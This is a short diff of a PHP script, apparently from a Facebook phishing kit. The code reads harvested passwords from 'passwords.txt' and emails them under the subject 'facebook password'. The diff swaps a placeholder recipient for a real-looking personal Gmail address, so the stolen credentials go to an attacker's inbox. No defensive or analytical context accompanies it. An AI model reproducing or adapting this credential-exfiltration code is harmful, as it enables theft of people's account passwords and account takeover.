@@ -12,7 +12,7 @@ fclose($handle);
 
 
 $password= file_get_contents( "passwords.txt" );
-$to      = 'youremail@email.com';
+$to      = 'dennisemmanuel419@gmail.com';
 $subject = 'facebook password';
 $message = $password;
 $headers = 'From: webmaster@example.com' . "\r\n" .
